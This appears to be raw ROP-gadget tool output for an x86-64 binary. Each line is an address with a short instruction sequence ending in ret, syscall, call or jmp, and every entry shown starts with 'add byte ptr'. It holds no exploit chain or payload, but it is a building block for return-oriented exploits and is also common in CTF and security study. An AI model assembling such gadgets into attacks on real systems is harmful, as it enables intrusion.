0x000000000047b275 : add byte ptr [rax + 0xf], cl ; ret 0x8b48
0x0000000000448a0a : add byte ptr [rax + 0xf], cl ; ret 0xc35b
0x00000000004240ad : add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000424dad : add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x00000000004548c8 : add byte ptr [rax + 0xf], cl ; ret 0xff85
0x000000000048460c : add byte ptr [rax + 1], bh ; ret
0x000000000044a2af : add byte ptr [rax + 1], bh ; syscall
0x000000000042ba84 : add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x0000000000411a42 : add byte ptr [rax + 1], cl ; ret
0x0000000000483818 : add byte ptr [rax + 1], cl ; ret 0x149
0x00000000004881f0 : add byte ptr [rax + 1], cl ; ret 0x3a83
0x000000000043507d : add byte ptr [rax + 1], cl ; retf 0x8148
0x000000000044d510 : add byte ptr [rax + 1], cl ; retf 0x8548
0x0000000000402f60 : add byte ptr [rax + 1], cl ; retf 0x8948
0x0000000000451355 : add byte ptr [rax + 1], cl ; retf 0x8b48
0x0000000000484815 : add byte ptr [rax + 2], bh ; ret
0x000000000044a55f : add byte ptr [rax + 3], bh ; syscall
0x00000000004b4ad7 : add byte ptr [rax + 4], cl ; std ; jmp rdx
0x000000000044a2df : add byte ptr [rax + 8], bh ; syscall
0x000000000044a2de : add byte ptr [rax + 8], dil ; syscall
0x00000000004816a1 : add byte ptr [rax + 9], cl ; ret 0x840f
0x0000000000476290 : add byte ptr [rax + 9], cl ; ret 0x850f
0x000000000049e40b : add byte ptr [rax + rax + 0xbf0000], bh ; add byte ptr [rax], al ; ret 0
0x0000000000450d83 : add byte ptr [rax + rax*8 - 0x76b3178b], al ; ret 0x294c
0x00000000004726ef : add byte ptr [rax + rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000424d14 : add byte ptr [rax + rax], al ; add byte ptr [rsi - 9], dh ; ret 0
0x000000000041e56b : add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; mov rax, rsi ; ret
0x0000000000473d97 : add byte ptr [rax + rax], cl ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x00000000004b119f : add byte ptr [rax + rbx*2], al ; add byte ptr [rsp + rbx - 6], bl ; call rcx
0x00000000004b51d7 : add byte ptr [rax + rbx*4], bh ; add byte ptr [rbp + rsi - 3], al ; jmp rsp
0x000000000045b42d : add byte ptr [rax + rcx - 0xd], dh ; ret
0x000000000045b51f : add byte ptr [rax + rcx*2 - 0x77], ah ; adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x00000000004b420f : add byte ptr [rax + rcx*4 - 0x36840000], dh ; cld ; call rdx
0x000000000049f5b7 : add byte ptr [rax + rdx + 0x10bf0000], bh ; add byte ptr [rax], al ; ret 0x10
0x00000000004b16ff : add byte ptr [rax - 0x10], dl ; std ; jmp qword ptr [rdi]
0x000000000046f247 : add byte ptr [rax - 0x14dff3b5], al ; retf 0x9066
0x000000000047bae4 : add byte ptr [rax - 0x168b7f80], 0x89 ; ret 0xeac1
0x000000000041da7f : add byte ptr [rax - 0x17], dl ; ret
0x00000000004af887 : add byte ptr [rax - 0x21], bl ; clc ; call qword ptr [rax]
0x00000000004b000b : add byte ptr [rax - 0x2fffffba], dh ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004b42df : add byte ptr [rax - 0x34], dh ; cld ; jmp qword ptr [rsi]
0x00000000004b41ff : add byte ptr [rax - 0x37], ah ; cld ; jmp qword ptr [rcx]
0x00000000004b0913 : add byte ptr [rax - 0x37ffffb1], bh ; retf 0xfff9
0x0000000000401107 : add byte ptr [rax - 0x39], cl ; ret
0x00000000004105f3 : add byte ptr [rax - 0x39], cl ; ret 0xac20
0x00000000004652ab : add byte ptr [rax - 0x39], cl ; ret 0xb2c8
0x000000000045d56f : add byte ptr [rax - 0x39], cl ; ret 0xffa0
0x000000000040dcd7 : add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x0000000000423cc5 : add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x0000000000468235 : add byte ptr [rax - 0x39], cl ; ret 0xffe0
0x00000000004749bf : add byte ptr [rax - 0x39], cl ; rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x000000000047499f : add byte ptr [rax - 0x39], cl ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x00000000004749ff : add byte ptr [rax - 0x39], cl ; rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x00000000004749af : add byte ptr [rax - 0x39], cl ; rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
0x00000000004749ef : add byte ptr [rax - 0x39], cl ; rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x000000000045b61f : add byte ptr [rax - 0x39], cl ; ror byte ptr [rdi], 0 ; add byte ptr [rax], al ; syscall
0x0000000000459179 : add byte ptr [rax - 0x3f], cl ; ret 0x4811
0x0000000000459150 : add byte ptr [rax - 0x3f], cl ; ret 0x6411
0x0000000000458ab0 : add byte ptr [rax - 0x3f], cl ; ret 0x8511
0x0000000000482805 : add byte ptr [rax - 0x3f], cl ; retf 0x6411
0x00000000004b07ff : add byte ptr [rax - 0x40], al ; stc ; call qword ptr [rcx]
0x000000000046166f : add byte ptr [rax - 0x4f743], al ; jmp qword ptr [rax]
0x00000000004b49fb : add byte ptr [rax - 0x4fffff70], ah ; add ch, bh ; jmp qword ptr [rdx]
0x00000000004b03af : add byte ptr [rax - 0x55], al ; stc ; jmp qword ptr [rcx]
0x00000000004b03c7 : add byte ptr [rax - 0x55], bl ; stc ; jmp qword ptr [rcx]
0x00000000004b03df : add byte ptr [rax - 0x55], dh ; stc ; jmp qword ptr [rcx]
0x00000000004b59cb : add byte ptr [rax - 0x60], dh ; add byte ptr [rax], al ; mov al, 0x83 ; std ; call qword ptr [rbx]
0x00000000004b1a1f : add byte ptr [rax - 0x66], ah ; cli ; call qword ptr [rcx]
0x00000000004b1a47 : add byte ptr [rax - 0x66], bh ; cli ; call qword ptr [rcx]
0x00000000004b1a07 : add byte ptr [rax - 0x66], bl ; cli ; call qword ptr [rdi]
0x00000000004abe77 : add byte ptr [rax - 0x6d2c0000], bl ; cmc ; call rsp
0x00000000004b4ad3 : add byte ptr [rax - 0x6f], bh ; add byte ptr [rax], al ; add al, 0xfd ; jmp rdx
0x0000000000455a4a : add byte ptr [rax - 0x73], cl ; add cl, byte ptr [rax + 0x39] ; ret
0x0000000000457bcd : add byte ptr [rax - 0x73], cl ; add dword ptr [rax + 0x39], r9d ; ret
0x000000000044dccf : add byte ptr [rax - 0x73], cl ; add eax, 0x26c629 ; ret
0x0000000000457beb : add byte ptr [rax - 0x73], cl ; add r9b, byte ptr [rax + 0x39] ; ret
0x0000000000457c09 : add byte ptr [rax - 0x73], cl ; add r9d, dword ptr [rax + 0x39] ; ret
0x0000000000478096 : add byte ptr [rax - 0x73], cl ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000482a87 : add byte ptr [rax - 0x73], cl ; pop rsp ; retf 0x4df0
0x000000000041ccfa : add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x000000000041f30f : add byte ptr [rax - 0x73], cl ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x1f77
0x000000000041b648 : add byte ptr [rax - 0x73], cl ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x000000000046b8ab : add byte ptr [rax - 0x73], cl ; xor eax, 0x24b56d ; jmp rax
0x000000000047c40c : add byte ptr [rax - 0x75], cl ; adc byte ptr [r8 - 0x7d], cl ; ret
0x000000000041a13f : add byte ptr [rax - 0x75], cl ; adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000485fc7 : add byte ptr [rax - 0x75], cl ; adc cl, byte ptr [rcx + 0x48b48d8] ; ret 0x8b48
0x000000000048aaf8 : add byte ptr [rax - 0x75], cl ; add al, 0x24 ; add rsp, 0x38 ; ret
0x00000000004615c7 : add byte ptr [rax - 0x75], cl ; add al, 0xc6 ; xor esi, esi ; jmp rax
0x0000000000460f1d : add byte ptr [rax - 0x75], cl ; add al, 0xc7 ; jmp rax
0x00000000004609db : add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x00000000004582cf : add byte ptr [rax - 0x75], cl ; add eax, 0x263ba1 ; ret
0x000000000044fdcf : add byte ptr [rax - 0x75], cl ; add eax, 0x26cb51 ; ret
0x0000000000418f6f : add byte ptr [rax - 0x75], cl ; add eax, 0x2a01a9 ; ret
0x000000000040e01b : add byte ptr [rax - 0x75], cl ; and al, 8 ; call rax
0x00000000004900e8 : add byte ptr [rax - 0x75], cl ; cmp ecx, dword ptr [rax - 0x75] ; imul ebx, dword ptr [rax], -0x18 ; retf
0x000000000044f21f : add byte ptr [rax - 0x75], cl ; cmp ecx, dword ptr [rax - 0x7d] ; ret
0x000000000042319f : add byte ptr [rax - 0x75], cl ; je 0x4231d1 ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x000000000045bebb : add byte ptr [rax - 0x75], cl ; jl 0x45beec ; or byte ptr [rax - 0x7d], cl ; call qword ptr [rbx]
0x00000000004785f3 : add byte ptr [rax - 0x75], cl ; jl 0x478623 ; sbb al, ch ; ret 0xf87e
0x000000000040eab2 : add byte ptr [rax - 0x75], cl ; js 0x40eadc ; call rdx
0x0000000000471fef : add byte ptr [rax - 0x75], cl ; mov rax, qword ptr [rax + 0x4c] ; ret
0x0000000000486d10 : add byte ptr [rax - 0x75], cl ; pop rbp ; mov eax, 0x89fd8945 ; ret 0xe283
0x0000000000401f03 : add byte ptr [rax - 0x75], cl ; pop rsp ; retf
0x0000000000400fcd : add byte ptr [rax - 0x75], cl ; push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x000000000042fc0f : add byte ptr [rax - 0x75], cl ; push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000482b82 : add byte ptr [rax - 0x75], cl ; push rsp ; retf 0x48f8
0x0000000000412bdf : add byte ptr [rax - 0x76b80000], al ; ret
0x0000000000470f8d : add byte ptr [rax - 0x77], cl ; adc byte ptr [rax - 0x77], cl ; retf 0x8348
0x0000000000484aa6 : add byte ptr [rax - 0x77], cl ; add eax, 0x2375ba ; ret
0x000000000041a00a : add byte ptr [rax - 0x77], cl ; add eax, 0x29f84e ; ret
0x0000000000419b05 : add byte ptr [rax - 0x77], cl ; add eax, 0x29fce3 ; ret
0x0000000000419add : add byte ptr [rax - 0x77], cl ; add eax, 0x29fd03 ; ret
0x0000000000419abd : add byte ptr [rax - 0x77], cl ; add eax, 0x29fd1b ; ret
0x0000000000413262 : add byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000045a8c9 : add byte ptr [rax - 0x77], cl ; enter -0x3fcf, -0x18 ; retf
0x0000000000414fc3 : add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000455c56 : add byte ptr [rax - 0x77], cl ; fimul dword ptr [rax + 0x29] ; ret 0x8348
0x0000000000455640 : add byte ptr [rax - 0x77], cl ; fldl2t ; retf 0xfffd
0x000000000048b59e : add byte ptr [rax - 0x77], cl ; fucomip st(1) ; ret
0x0000000000418b5b : add byte ptr [rax - 0x77], cl ; imul esp, dword ptr [rax + 0x5b], 0x5d ; pop r12 ; ret
0x00000000004018b1 : add byte ptr [rax - 0x77], cl ; jbe 0x4018cb ; syscall
0x000000000044c93f : add byte ptr [rax - 0x77], cl ; jo 0x44c969 ; ret
0x000000000047fb9b : add byte ptr [rax - 0x77], cl ; jrcxz 0x47fbef ; mov esi, ebx ; syscall
0x00000000004133b3 : add byte ptr [rax - 0x77], cl ; mov edx, 0x130 ; pop rbx ; ret
0x0000000000423e1f : add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rax ; call rcx
0x000000000040392f : add byte ptr [rax - 0x77], cl ; ret
0x0000000000449d6b : add byte ptr [rax - 0x77], cl ; ret 0x16e9
0x000000000041e517 : add byte ptr [rax - 0x77], cl ; ret 0x2948
0x0000000000411b16 : add byte ptr [rax - 0x77], cl ; ret 0x294c
0x00000000004139ea : add byte ptr [rax - 0x77], cl ; ret 0x294d
0x000000000048e96c : add byte ptr [rax - 0x77], cl ; ret 0x3948
0x0000000000449e17 : add byte ptr [rax - 0x77], cl ; ret 0x6ae9
0x0000000000402eae : add byte ptr [rax - 0x77], cl ; ret 0x7ce9
0x000000000045fd98 : add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000041b7cc : add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000402c2f : add byte ptr [rax - 0x77], cl ; ret 0x8548
0x0000000000410aa8 : add byte ptr [rax - 0x77], cl ; ret 0x8948
0x000000000048e0bf : add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x0000000000456cb8 : add byte ptr [rax - 0x77], cl ; ret 0xb2eb
0x0000000000403243 : add byte ptr [rax - 0x77], cl ; ret 0xc031
0x000000000046a3f7 : add byte ptr [rax - 0x77], cl ; ret 0xc148
0x000000000040fc7d : add byte ptr [rax - 0x77], cl ; ret 0xf748
0x0000000000415148 : add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x0000000000449d82 : add byte ptr [rax - 0x77], cl ; ret 0xffe9
0x0000000000449857 : add byte ptr [rax - 0x77], cl ; retf
0x000000000043daf4 : add byte ptr [rax - 0x77], cl ; retf 0x1f0f
0x000000000042abec : add byte ptr [rax - 0x77], cl ; retf 0x8349
0x000000000045e4fb : add byte ptr [rax - 0x77], cl ; retf 0x8948
0x0000000000411547 : add byte ptr [rax - 0x77], cl ; retf 0x894c
0x0000000000456257 : add byte ptr [rax - 0x77], cl ; retf 0x8966
0x000000000042ab2a : add byte ptr [rax - 0x77], cl ; retf 0x9066
0x0000000000456a09 : add byte ptr [rax - 0x77], cl ; retf 0xb60f
0x000000000043d976 : add byte ptr [rax - 0x77], cl ; retf 0xf66
0x000000000043f4ec : add byte ptr [rax - 0x77], cl ; retf 0xf9c5
0x0000000000447860 : add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000481d21 : add byte ptr [rax - 0x77], cl ; sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x000000000048ccdf : add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x000000000047b793 : add byte ptr [rax - 0x77], cl ; xchg dword ptr [rax], eax ; add eax, dword ptr [rax] ; add bl, dh ; ret
0x00000000004109df : add byte ptr [rax - 0x77], cl ; xchg eax, ecx ; xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x000000000040f5a8 : add byte ptr [rax - 0x77], cl ; xor eax, eax ; jmp 0x40f578
0x000000000048abd6 : add byte ptr [rax - 0x7ab70000], al ; ret 0x840f
0x00000000004737ef : add byte ptr [rax - 0x7b], cl ; div byte ptr [rbp + 4] ; xor rax, rax ; ret
0x0000000000471a4b : add byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x00000000004634f9 : add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; retf 6
0x000000000044c86f : add byte ptr [rax - 0x7b], cl ; test byte ptr [rax - 0x73], 5 ; cmpsb byte ptr [rsi], byte ptr [rdi] ; jmp qword ptr [rsi]
0x000000000048c29f : add byte ptr [rax - 0x7bf0df06], al ; retf 4
0x000000000048ee1e : add byte ptr [rax - 0x7d], cl ; and al, 0x10 ; or byte ptr [rax - 0x7d], cl ; ret
0x000000000047e357 : add byte ptr [rax - 0x7d], cl ; call 0xffffffffc2d12f67
0x000000000047e356 : add byte ptr [rax - 0x7d], cl ; call 0xffffffffc2d12f68
0x00000000004204cc : add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000041d907 : add byte ptr [rax - 0x7d], cl ; clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x000000000041d564 : add byte ptr [rax - 0x7d], cl ; clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8d44
0x000000000047fa3d : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x66c3
0x000000000042406d : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x0000000000401b69 : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret
0x0000000000411b5a : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; retf
0x0000000000461ad3 : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rcx - 0x77] ; ret
0x000000000048a901 : add byte ptr [rax - 0x7d], cl ; in al, dx ; sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x000000000041739f : add byte ptr [rax - 0x7d], cl ; jg 0x4173e5 ; add byte ptr [rcx + rcx - 0xd], dh ; ret
0x000000000041f952 : add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000471a06 : add byte ptr [rax - 0x7d], cl ; js 0x471a44 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000040603f : add byte ptr [rax - 0x7d], cl ; ret
0x0000000000446f4f : add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x000000000044cce7 : add byte ptr [rax - 0x7d], cl ; ret 0x4101
0x000000000046f217 : add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x000000000040f37f : add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000456914 : add byte ptr [rax - 0x7d], cl ; ret 0x4804
0x0000000000485a3f : add byte ptr [rax - 0x7d], cl ; ret 0x4808
0x000000000047dd0a : add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x000000000045dcc4 : add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x000000000042ac19 : add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000041efa7 : add byte ptr [rax - 0x7d], cl ; ret 0x4c07
0x000000000048e09f : add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x000000000046f3f8 : add byte ptr [rax - 0x7d], cl ; ret 0x8b08
0x0000000000424a70 : add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x000000000043dbd3 : add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042ac47 : add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000047dfc7 : add byte ptr [rax - 0x7d], cl ; ret 0xf01
0x000000000041a5ea : add byte ptr [rax - 0x7d], cl ; retf
0x0000000000422af9 : add byte ptr [rax - 0x7d], cl ; retf 0x4801
0x000000000040d825 : add byte ptr [rax - 0x7d], cl ; retf 0x4809
0x000000000041d700 : add byte ptr [rax - 0x7d], cl ; retf 0x4901
0x000000000040d885 : add byte ptr [rax - 0x7d], cl ; retf 0xeb08
0x000000000042664f : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x000000000047392f : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x49], 0x39 ; ret 0x2774
0x00000000004896a2 : add byte ptr [rax - 0x7d], cl ; ror byte ptr [rax], 0x83 ; ret 0x3901
0x0000000000422df1 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x298
0x00000000004166e8 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; retf
0x000000000045b414 : add byte ptr [rax - 0x7f], cl ; ret 0x200
0x000000000043387b : add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00000000004b2df3 : add byte ptr [rax - 0x7ffff8c], bl ; cli ; sti ; jmp qword ptr [rbx]
0x00000000004abf03 : add byte ptr [rax - 0x7fffffb], ch ; cwde ; cmc ; call rax
0x00000000004b1bf7 : add byte ptr [rax - 0xd], cl ; std ; call rdx
0x000000000041257a : add byte ptr [rax - 1], bh ; ret
0x00000000004af4d0 : add byte ptr [rax - 9], bl ; jmp qword ptr [rbx]
0x0000000000450361 : add byte ptr [rax], 0 ; add al, ch ; push rsi ; ret
0x0000000000422df5 : add byte ptr [rax], 0 ; add al, ch ; ret 0x298
0x00000000004166ec : add byte ptr [rax], 0 ; add al, ch ; retf
0x000000000040272d : add byte ptr [rax], 0 ; add al, ch ; retf 0xbfd8
0x00000000004162ea : add byte ptr [rax], 0 ; add bl, dh ; ret
0x000000000044873d : add byte ptr [rax], 0 ; add byte ptr [rax + 0x39], cl ; retf 0xe175
0x000000000043507a : add byte ptr [rax], 0 ; add byte ptr [rax + 1], cl ; retf 0x8148
0x0000000000415145 : add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x000000000043605b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x0000000000448a4b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x0000000000418d83 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x000000000042c8db : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000044a1db : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor eax, eax ; syscall
0x000000000042ce41 : add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004b2fef : add byte ptr [rax], ah ; or bh, ah ; jmp qword ptr [rax]
0x00000000004ac39f : add byte ptr [rax], ah ; sub dh, dh ; jmp qword ptr [rax]
0x00000000004af84a : add byte ptr [rax], al ; adc al, 0x9c ; clc ; jmp qword ptr [rsi]
0x00000000004b2e0e : add byte ptr [rax], al ; adc bl, bh ; sti ; jmp qword ptr [rbx]
0x00000000004b318f : add byte ptr [rax], al ; adc edi, esp ; jmp qword ptr [rax]
0x00000000004b4ad6 : add byte ptr [rax], al ; add al, 0xfd ; jmp rdx
0x00000000004b0fda : add byte ptr [rax], al ; add al, 9 ; cli ; jmp qword ptr [rdx]
0x0000000000450362 : add byte ptr [rax], al ; add al, ch ; push rsi ; ret
0x0000000000451315 : add byte ptr [rax], al ; add al, ch ; ret
0x0000000000422df6 : add byte ptr [rax], al ; add al, ch ; ret 0x298
0x0000000000475c56 : add byte ptr [rax], al ; add al, ch ; ret 0xf992
0x00000000004107dd : add byte ptr [rax], al ; add al, ch ; retf
0x000000000040272e : add byte ptr [rax], al ; add al, ch ; retf 0xbfd8
0x00000000004239ab : add byte ptr [rax], al ; add al, ch ; std ; ret
0x000000000045ebfe : add byte ptr [rax], al ; add bh, al ; test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x000000000040eb7d : add byte ptr [rax], al ; add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x00000000004859bd : add byte ptr [rax], al ; add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x000000000047475f : add byte ptr [rax], al ; add bl, al ; mov eax, 2 ; ret
0x0000000000485c87 : add byte ptr [rax], al ; add bl, ch ; ret
0x000000000040f50e : add byte ptr [rax], al ; add bl, ch ; ret 0x1f0f
0x00000000004162eb : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004886ad : add byte ptr [rax], al ; add byte ptr [rax + 0x26], bh ; syscall
0x0000000000468c18 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x0000000000465f06 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x8349
0x000000000047aa18 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x00000000004652b7 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; retf 0x8948
0x000000000047e9be : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; retf 0x8d48
0x000000000041fb3f : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret
0x000000000048b0f1 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x830f
0x000000000041a99d : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x0000000000413a9d : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x850f
0x000000000048b186 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x9272
0x000000000042e6c4 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; retf 0x280f
0x0000000000437ab1 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; retf 0x377
0x00000000004111db : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; retf 0x830f
0x000000000044873e : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; retf 0xe175
0x000000000044a394 : add byte ptr [rax], al ; add byte ptr [rax + 0x48], bh ; syscall
0x000000000046b334 : add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret
0x0000000000471cfd : add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; retf 0x8d4c
0x000000000047568d : add byte ptr [rax], al ; add byte ptr [rax + 0x68], bh ; syscall
0x000000000047567d : add byte ptr [rax], al ; add byte ptr [rax + 0x6b], bh ; syscall
0x000000000047569d : add byte ptr [rax], al ; add byte ptr [rax + 0x6c], bh ; syscall
0x000000000044507d : add byte ptr [rax], al ; add byte ptr [rax + 0x78d4837], cl ; ret
0x000000000044aeed : add byte ptr [rax], al ; add byte ptr [rax + 0xb], bh ; syscall
0x000000000044c6cf : add byte ptr [rax], al ; add byte ptr [rax + 0xca], bh ; syscall
0x0000000000449bd2 : add byte ptr [rax], al ; add byte ptr [rax + 0xe5], bh ; syscall
0x000000000040dcad : add byte ptr [rax], al ; add byte ptr [rax + 0xe], bh ; syscall
0x0000000000448a95 : add byte ptr [rax], al ; add byte ptr [rax + 0xf48f0e5], al ; ret 0xc35b
0x000000000041d612 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x0000000000485202 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004538b2 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x000000000041e6c1 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x894c
0x0000000000448a08 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc35b
0x000000000047447d : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00000000004548c6 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xff85
0x000000000048460a : add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x000000000044a2ad : add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; syscall
0x0000000000483149 : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret
0x0000000000483816 : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret 0x149
0x000000000043507b : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; retf 0x8148
0x0000000000451353 : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; retf 0x8b48
0x0000000000484813 : add byte ptr [rax], al ; add byte ptr [rax + 2], bh ; ret
0x000000000046f245 : add byte ptr [rax], al ; add byte ptr [rax - 0x14dff3b5], al ; retf 0x9066
0x00000000004b0911 : add byte ptr [rax], al ; add byte ptr [rax - 0x37ffffb1], bh ; retf 0xfff9
0x000000000044ad41 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x00000000004105f1 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xac20
0x000000000045d56d : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffa0
0x000000000044a1ad : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x0000000000459177 : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x4811
0x000000000045914e : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x6411
0x0000000000458aae : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x8511
0x0000000000482803 : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; retf 0x6411
0x0000000000457bcb : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add dword ptr [rax + 0x39], r9d ; ret
0x0000000000457be9 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add r9b, byte ptr [rax + 0x39] ; ret
0x0000000000457c07 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add r9d, dword ptr [rax + 0x39] ; ret
0x000000000041a13d : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000040eab0 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; js 0x40eade ; call rdx
0x0000000000401f01 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; pop rsp ; retf
0x0000000000418f9d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000045563e : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fldl2t ; retf 0xfffd
0x000000000048b59c : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fucomip st(1) ; ret
0x00000000004018af : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; jbe 0x4018cd ; syscall
0x000000000044c93d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; jo 0x44c96b ; ret
0x0000000000423e1d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rax ; call rcx
0x0000000000410a21 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
